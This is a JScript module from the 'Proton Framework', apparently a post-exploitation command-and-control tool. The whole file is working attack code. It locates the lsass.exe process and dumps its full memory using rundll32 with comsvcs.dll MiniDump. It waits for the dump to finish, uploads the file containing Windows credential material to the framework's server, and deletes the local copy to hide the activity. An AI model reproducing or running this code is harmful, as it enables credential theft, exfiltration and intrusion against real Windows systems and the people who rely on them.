//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

try
{
    var headers = {};

    var res_file = "~DIRECTORY~\\"+proton.uuid()+".bin";

    var lpid = "";

    if (~LSASSPID~ == 0)
    {
        lpid = proton.process.getPID("lsass.exe");
        if (lpid)
        {
            proton.work.report(lpid.toString(),{'Task': 'pid'});
        }
        else
        {
            proton.work.report('',{'Task': 'nopid'});
            var e = Error('Could not identify process ID');
            throw e;
        }
    }
    else
    {
        lpid = ~LSASSPID~;
    }

    var cmd = "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump "+ lpid.toString()+ " " + res_file + " full";
    
    proton.work.report('',{'Task': 'startrun'});
    var newpid = proton.WMI.createProcess(cmd, true);

    /* 
       we only get a process ID returned, so we have to search through running processes
       until we can't find the process anymore. then we'll be able to upload.
    */
    var pidflag = true;
    while (pidflag)
    {
        pidflag = false;
        var processes = proton.process.list();
        var items = new Enumerator(processes);
        while (!items.atEnd())
        {
            var proc = items.item();

            try
            {
                if (proc.ProcessId == newpid)
                {
                    pidflag = true;
                    break;
                }
            } catch (e)
            {
            }
            items.moveNext();
        }
    }
    proton.work.report('',{'Task': 'endrun'});

    proton.work.report('',{'Task': 'upload'});
    proton.http.upload(res_file, 'dump', ~CERTUTIL~, 'Task');

    proton.work.report('',{'Task': 'delbin'});
    proton.file.deleteFile(res_file);

}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
